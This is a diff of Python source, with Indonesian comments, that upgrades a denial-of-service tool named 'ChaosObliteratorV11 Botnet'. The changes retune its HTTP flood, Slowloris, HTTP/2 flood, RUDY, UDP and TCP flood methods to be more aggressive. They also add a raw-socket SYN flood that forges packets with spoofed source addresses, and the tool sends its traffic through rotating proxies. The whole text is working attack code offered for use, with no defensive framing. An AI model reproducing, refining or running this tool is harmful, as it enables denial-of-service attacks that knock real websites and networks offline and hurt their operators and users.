-        """Refresh cookies every 8 seconds."""
-        while time.time() < self.end_time:
+        """Refresh cookie setiap 6 detik."""
+        while time.time() < self.end_time and self.running:
             try:
                 self._get_browser_session()
             except Exception as e:
                 logging.error(f"Refresh cookie gagal: {e}")
-            time.sleep(8)
+            time.sleep(6)
 
     def _scan_ports(self):
-        """Dynamic port scanning for L4 targets with enhanced efficiency."""
+        """Scan port dinamis untuk target L4."""
         if not self.target_l4:
             return
         new_ports = []
@@ -747,7 +753,7 @@ class ChaosObliteratorV10:
         for port in test_ports:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.03)
+                sock.settimeout(0.02)
                 sock.connect((self.target_l4, port))
                 new_ports.append(port)
                 sock.close()
@@ -759,17 +765,17 @@ class ChaosObliteratorV10:
         logging.info(f"Port aktif terdeteksi: {self.active_ports}")
 
     def _adjust_jitter(self, thread_id: int, response_time: float):
-        """Per-thread adaptive jitter with intensity adjustment."""
+        """Jitter adaptif per thread dengan intensitas."""
         settings = self.intensity_settings[self.intensity]
         with self.lock:
-            if response_time > 100:
-                self.jitter_factors[thread_id] = min(self.jitter_factors[thread_id] * 1.3, 2.5)
-            elif response_time < 30:
-                self.jitter_factors[thread_id] = max(self.jitter_factors[thread_id] * 0.7, 0.3)
+            if response_time > 80:
+                self.jitter_factors[thread_id] = min(self.jitter_factors[thread_id] * 1.4, 3.0)
+            elif response_time < 20:
+                self.jitter_factors[thread_id] = max(self.jitter_factors[thread_id] * 0.6, 0.2)
         return random.expovariate(1 / self.jitter_factors[thread_id]) * settings["delay"]
 
     def _chaoshttp(self, thread_id: int):
-        """L7: Enhanced HTTP flood with compression and intensity."""
+        """L7: HTTP flood dengan optimasi."""
         if not self.target_l7:
             return
         session = tls_client.Session(
@@ -778,7 +784,7 @@ class ChaosObliteratorV10:
         )
         settings = self.intensity_settings[self.intensity]
         for _ in range(settings["packets_per_thread"]):
-            if time.time() >= self.end_time:
+            if time.time() >= self.end_time or not self.running:
                 break
             start_time = time.time()
             try:
@@ -789,11 +795,11 @@ class ChaosObliteratorV10:
                 body = self._random_payload(settings["payload_size"]) if method in ["POST", "PUT"] else None
                 proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
                 if method == "GET":
-                    resp = session.get(url, headers=headers, proxy=proxy, timeout=3)
+                    resp = session.get(url, headers=headers, proxy=proxy, timeout=2)
                 elif method == "HEAD":
-                    resp = session.head(url, headers=headers, proxy=proxy, timeout=3)
+                    resp = session.head(url, headers=headers, proxy=proxy, timeout=2)
                 else:
-                    resp = session.post(url, headers=headers, data=body, proxy=proxy, timeout=3)
+                    resp = session.post(url, headers=headers, data=body, proxy=proxy, timeout=2)
                 self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                 with self.lock:
                     self.success_count["chaoshttp"] += 1 if resp.status_code < 400 else 0
@@ -805,7 +811,7 @@ class ChaosObliteratorV10:
                 logging.debug(f"ChaosHTTP thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")
 
     def _ghostloris(self, thread_id: int):
-        """L7: Enhanced Slowloris with partial headers and intensity."""
+        """L7: Slowloris dengan header parsial."""
         if not self.target_l7:
             return
         settings = self.intensity_settings[self.intensity]
@@ -815,7 +821,7 @@ class ChaosObliteratorV10:
                 random_tls_extension_order=True
             )
             for _ in range(settings["packets_per_thread"]):
-                if time.time() >= self.end_time:
+                if time.time() >= self.end_time or not self.running:
                     break
                 start_time = time.time()
                 try:
@@ -823,13 +829,13 @@ class ChaosObliteratorV10:
                         "User-Agent": random.choice(self.user_agents),
                         "X-Forwarded-For": self._random_ip(),
                         "Connection": "keep-alive",
-                        "Content-Length": str(random.randint(1000, 10000))
+                        "Content-Length": str(random.randint(1000, 5000))
                     }
                     headers.update(self.session_headers)
                     path = self._random_path()
                     url = f"https://{self.target_l7}{path}"
                     proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
-                    session.post(url, headers=headers, data=self._random_payload(10), timeout=0.05, proxy=proxy)
+                    session.post(url, headers=headers, data=self._random_payload(5), timeout=0.04, proxy=proxy)
                     self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                     with self.lock:
                         self.success_count["ghostloris"] += 1
@@ -843,13 +849,13 @@ class ChaosObliteratorV10:
             logging.error(f"GhostLoris thread {thread_id} gagal inisialisasi: {e}")
 
     def _http2flood(self, thread_id: int):
-        """L7: HTTP/2 flood with multiple streams."""
+        """L7: HTTP/2 flood dengan stream paralel."""
         if not self.target_l7:
             return
         settings = self.intensity_settings[self.intensity]
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3)
+            sock.settimeout(2)
             sock.connect((self.target_l7, 443))
             context = ssl._create_unverified_context()
             sock = context.wrap_socket(sock, server_hostname=self.target_l7)
@@ -857,7 +863,7 @@ class ChaosObliteratorV10:
             h2conn.initiate_connection()
             sock.sendall(h2conn.data_to_send())
             for _ in range(settings["packets_per_thread"]):
-                if time.time() >= self.end_time:
+                if time.time() >= self.end_time or not self.running:
                     break
                 start_time = time.time()
                 try:
@@ -879,7 +885,7 @@ class ChaosObliteratorV10:
             logging.error(f"HTTP2Flood thread {thread_id} gagal inisialisasi: {e}")
 
     def _rudy(self, thread_id: int):
-        """L7: RUDY (R-U-Dead-Yet) attack with slow POST."""
+        """L7: RUDY attack dengan POST lambat."""
         if not self.target_l7:
             return
         settings = self.intensity_settings[self.intensity]
@@ -889,7 +895,7 @@ class ChaosObliteratorV10:
                 random_tls_extension_order=True
             )
             for _ in range(settings["packets_per_thread"]):
-                if time.time() >= self.end_time:
+                if time.time() >= self.end_time or not self.running:
                     break
                 start_time = time.time()
                 try:
@@ -898,17 +904,17 @@ class ChaosObliteratorV10:
                         "X-Forwarded-For": self._random_ip(),
                         "Connection": "keep-alive",
                         "Content-Type": "application/x-www-form-urlencoded",
-                        "Content-Length": str(random.randint(10000, 100000))
+                        "Content-Length": str(random.randint(5000, 20000))
                     }
                     headers.update(self.session_headers)
                     path = self._random_path()
                     url = f"https://{self.target_l7}{path}"
                     proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
                     data = self._random_payload(settings["payload_size"])
-                    session.post(url, headers=headers, data=data[:10], timeout=0.05, proxy=proxy)
-                    for chunk in [data[i:i+10] for i in range(10, len(data), 10)]:
-                        session.post(url, headers=headers, data=chunk, timeout=0.05, proxy=proxy)
-                        time.sleep(random.uniform(0.05, 0.1))
+                    session.post(url, headers=headers, data=data[:5], timeout=0.04, proxy=proxy)
+                    for chunk in [data[i:i+5] for i in range(5, len(data), 5)]:
+                        session.post(url, headers=headers, data=chunk, timeout=0.04, proxy=proxy)
+                        time.sleep(random.uniform(0.03, 0.08))
                     with self.lock:
                         self.success_count["rudy"] += 1
                         self.response_times["rudy"].append((time.time() - start_time) * 1000)
@@ -921,13 +927,13 @@ class ChaosObliteratorV10:
             logging.error(f"RUDY thread {thread_id} gagal inisialisasi: {e}")
 
     def _udpchaos(self, thread_id: int):
-        """L4: Enhanced UDP flood with intensity control."""
+        """L4: UDP flood dengan intensitas kontrol."""
         if not self.target_l4:
             return
         settings = self.intensity_settings[self.intensity]
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         for _ in range(settings["packets_per_thread"]):
-            if time.time() >= self.end_time:
+            if time.time() >= self.end_time or not self.running:
                 break
             start_time = time.time()
             try:
@@ -944,17 +950,17 @@ class ChaosObliteratorV10:
         sock.close()
 
     def _tcpobliterator(self, thread_id: int):
-        """L4: Enhanced TCP flood with intensity control."""
+        """L4: TCP flood dengan intensitas kontrol."""
         if not self.target_l4:
             return
         settings = self.intensity_settings[self.intensity]
         for _ in range(settings["packets_per_thread"]):
-            if time.time() >= self.end_time:
+            if time.time() >= self.end_time or not self.running:
                 break
             start_time = time.time()
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.01)
+                sock.settimeout(0.008)
                 port = random.choice(self.active_ports)
                 sock.connect((self.target_l4, port))
                 sock.send(self._random_payload(settings["payload_size"]))
@@ -967,36 +973,68 @@ class ChaosObliteratorV10:
             finally:
                 logging.debug(f"TCPObliterator thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")
 
+    def _synflood(self, thread_id: int):
+        """L4: SYN flood untuk membebani tabel koneksi."""
+        if not self.target_l4:
+            return
+        settings = self.intensity_settings[self.intensity]
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        for _ in range(settings["packets_per_thread"]):
+            if time.time() >= self.end_time or not self.running:
+                break
+            start_time = time.time()
+            try:
+                port = random.choice(self.active_ports)
+                # Buat header IP sederhana
+                ip_header = b'\x45\x00\x00\x28' + os.urandom(4) + b'\x40\x00\x40\x06\x00\x00' + socket.inet_aton(self._random_ip()) + socket.inet_aton(self.target_l4)
+                # Buat header TCP dengan SYN flag
+                tcp_header = (random.randint(1024, 65535)).to_bytes(2, 'big') + port.to_bytes(2, 'big') + b'\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x71\x10\x00\x00\x00\x00'
+                packet = ip_header + tcp_header
+                sock.sendto(packet, (self.target_l4, port))
+                with self.lock:
+                    self.success_count["synflood"] += 1
+                time.sleep(self._adjust_jitter(thread_id, 0))
+            except:
+                pass
+            finally:
+                logging.debug(f"SYNFlood thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")
+        sock.close()
+
     def _monitor_resources(self):
-        """Monitor CPU and memory usage."""
-        while time.time() < self.end_time:
-            cpu_percent = psutil.cpu_percent(interval=1)
-            mem = psutil.virtual_memory()
-            mem_percent = mem.percent
-            if cpu_percent > 90 or mem_percent > 90:
-                logging.warning(f"Resource tinggi: CPU {cpu_percent}%, Memori {mem_percent}%")
-                self.intensity = "low"
-                logging.info("Menurunkan intensitas ke 'low' untuk mencegah crash.")
-            time.sleep(5)
+        """Pantau penggunaan CPU dan memori."""
+        while time.time() < self.end_time and self.running:
+            try:
+                cpu_percent = psutil.cpu_percent(interval=1)
+                mem = psutil.virtual_memory()
+                mem_percent = mem.percent
+                if cpu_percent > 85 or mem_percent > 85:
+                    logging.warning(f"Resource tinggi: CPU {cpu_percent}%, Memori {mem_percent}%")
+                    self.intensity = "low"
+                    logging.info("Menurunkan intensitas ke 'low' untuk mencegah crash.")
+                logging.debug(f"Resource: CPU {cpu_percent}%, Memori {mem_percent}%")
+                time.sleep(3)
+            except Exception as e:
+                logging.error(f"Pemantauan resource gagal: {e}")
 
     def _save_state(self):
-        """Save state before shutdown."""
+        """Simpan status sebelum shutdown."""
         state = {
             "timestamp": time.time(),
             "success_count": self.success_count,
             "response_times": {k: sum(v)/len(v) if v else 0 for k, v in self.response_times.items()},
             "cookies": dict(self.cookies)
         }
-        with open("chaos_obliterator_v10_state.json", "w") as f:
+        with open("chaos_obliterator_v11_state.json", "w") as f:
             json.dump(state, f, indent=2)
-        logging.info("Status disimpan ke chaos_obliterator_v10_state.json")
+        logging.info("Status disimpan ke chaos_obliterator_v11_state.json")
 
     def start(self):
-        """Start the obliterator with resource monitoring."""
+        """Jalankan obliterator dengan kontrol stabilitas."""
         if not self.target_l7 and not self.target_l4:
             logging.error("Setidaknya satu target (L7 atau L4) diperlukan")
             return
-        logging.info(f"ChaosObliteratorV10 serang L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, metode: {self.methods}, mode proxy: {self.proxy_mode}, pool proxy: {len(self.proxy_pool)} proxy, intensitas: {self.intensity}")
+        logging.info(f"ChaosObliteratorV11 serang L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, metode: {self.methods}, mode proxy: {self.proxy_mode}, pool proxy: {len(self.proxy_pool)} proxy, intensitas: {self.intensity}")
         
         if not self._check_environment():
             logging.error("Pemeriksaan lingkungan gagal, keluar.")
@@ -1006,11 +1044,11 @@ class ChaosObliteratorV10:
         
         if self.target_l7:
             threading.Thread(target=self._refresh_cookies, daemon=True).start()
-            time.sleep(3)
+            time.sleep(2)
         
         if self.target_l4:
             threading.Thread(target=self._scan_ports, daemon=True).start()
-            time.sleep(0.2)
+            time.sleep(0.15)
         
         threads = []
         method_funcs = {
@@ -1019,37 +1057,45 @@ class ChaosObliteratorV10:
             "http2flood": self._http2flood,
             "rudy": self._rudy,
             "udpchaos": self._udpchaos,
-            "tcpobliterator": self._tcpobliterator
+            "tcpobliterator": self._tcpobliterator,
+            "synflood": self._synflood
         }
         try:
             for method in self.methods:
                 if method in method_funcs:
-                    for i in range(self.threads // len(self.methods)):
+                    for i in range(min(self.threads // len(self.methods), self.intensity_settings[self.intensity]["max_threads_per_method"])):
                         t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
                         threads.append(t)
             for t in threads:
                 t.start()
+                time.sleep(0.05)  # Hindari race condition
             for t in threads:
-                t.join()
+                t.join(timeout=self.duration)
         except KeyboardInterrupt:
             logging.info("Menerima KeyboardInterrupt, menutup dengan rapi...")
+            self.running = False
+            self._save_state()
+        except Exception as e:
+            logging.error(f"Error saat menjalankan thread: {e}")
+            self.running = False
             self._save_state()
         finally:
+            self.running = False
             self._save_state()
             avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
             logging.info(f"Obliterasi selesai. Jumlah keberhasilan: {self.success_count}, Rata-rata waktu respons (ms): {avg_response}")
 
 def main(target_l7: str, target_l4: str, duration: int, methods: str, proxy_mode: str, proxy_list: str, intensity: str):
     methods = methods.split(",")
-    obliterator = ChaosObliteratorV10(target_l7, target_l4, duration, methods=methods, proxy_mode=proxy_mode, proxy_list=proxy_list, intensity=intensity)
+    obliterator = ChaosObliteratorV11(target_l7, target_l4, duration, methods=methods, proxy_mode=proxy_mode, proxy_list=proxy_list, intensity=intensity)
     obliterator.start()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="ChaosObliteratorV10 Botnet")
+    parser = argparse.ArgumentParser(description="ChaosObliteratorV11 Botnet")
     parser.add_argument("target_l7", nargs="?", default=None, help="URL target L7 (contoh: http://httpbin.org)")
     parser.add_argument("target_l4", nargs="?", default=None, help="IP target L4 (contoh: 93.184.216.34)")
     parser.add_argument("--duration", type=int, default=60, help="Durasi dalam detik")
-    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,http2flood,rudy,udpchaos,tcpobliterator", help="Metode dipisahkan koma")
+    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,http2flood,rudy,udpchaos,tcpobliterator,synflood", help="Metode dipisahkan koma")
     parser.add_argument("--proxy-mode", type=str, default="auto", choices=["auto", "manual", "none"], help="Mode proxy: auto, manual, atau none")
     parser.add_argument("--proxy-list", type=str, default=None, help="Daftar proxy dipisahkan koma untuk mode manual (contoh: http://1.2.3.4:8080,http://5.6.7.8:8080)")
     parser.add_argument("--intensity", type=str, default="medium", choices=["low", "medium", "high"], help="Intensitas serangan: low, medium, high")
